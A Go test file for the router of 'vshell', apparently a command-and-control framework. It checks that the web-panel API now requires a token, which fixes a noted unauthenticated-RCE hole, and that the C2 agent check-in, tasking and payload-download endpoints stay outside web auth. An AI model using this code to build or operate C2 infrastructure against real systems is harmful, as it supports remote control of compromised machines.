package router

import (
	"net/http"
	"net/http/httptest"
	"testing"

	"vshell/utils"
)

// TestAPIAuthRequired verifies that the web-panel API now requires a valid
// token. Regression test for the security hole where every controller embedded
// a no-op Prepare(), leaving the whole API unauthenticated (unauthenticated
// command dispatch / RCE on agents, file read, settings modification, ...).
func TestAPIAuthRequired(t *testing.T) {
	mux := InitRouter()

	protected := []string{
		"/api/runner",
		"/api/client/list",
		"/api/setting/get",
		"/api/file/ls",
		"/api/listener/list",
		"/api/tunnel/list",
		"/api/download/stageless",
		"/api/getUserInfo",
		"/api/getMenuList",
	}

	for _, path := range protected {
		req := httptest.NewRequest(http.MethodPost, path, nil)
		rec := httptest.NewRecorder()
		mux.ServeHTTP(rec, req)
		if rec.Code != http.StatusUnauthorized {
			t.Errorf("%s without token = %d, want 401", path, rec.Code)
		}

		// With a valid token the request should pass the middleware (the
		// handler itself may still 400/405 on bad input, but not 401).
		tok, err := utils.GenerateToken("admin")
		if err != nil {
			t.Fatalf("generate token: %v", err)
		}
		req2 := httptest.NewRequest(http.MethodPost, path, nil)
		req2.Header.Set("Token", tok)
		rec2 := httptest.NewRecorder()
		mux.ServeHTTP(rec2, req2)
		if rec2.Code == http.StatusUnauthorized {
			t.Errorf("%s with valid token = 401, want non-401", path)
		}
	}
}

// TestAPIAuthPublicEndpoints verifies the SPA's pre-login endpoints stay open.
func TestAPIAuthPublicEndpoints(t *testing.T) {
	mux := InitRouter()
	for _, path := range []string{"/api/login", "/api/logout", "/api/health", "/health"} {
		req := httptest.NewRequest(http.MethodGet, path, nil)
		rec := httptest.NewRecorder()
		mux.ServeHTTP(rec, req)
		if rec.Code == http.StatusUnauthorized {
			t.Errorf("%s should be public, got 401", path)
		}
	}
}

// TestAPIAuthDoesNotWrapAgentEndpoints verifies the C2 agent protocol and
// agent-binary delivery endpoints are NOT web-auth gated (they use verify
// keys / are public downloads, matching the original binary).
func TestAPIAuthDoesNotWrapAgentEndpoints(t *testing.T) {
	mux := InitRouter()
	for _, path := range []string{"/c2/l/1/checkin", "/c2/l/1/tasks", "/swt", "/sww", "/swl"} {
		req := httptest.NewRequest(http.MethodPost, path, nil)
		rec := httptest.NewRecorder()
		mux.ServeHTTP(rec, req)
		if rec.Code == http.StatusUnauthorized {
			t.Errorf("%s should not be web-auth gated, got 401", path)
		}
	}
}
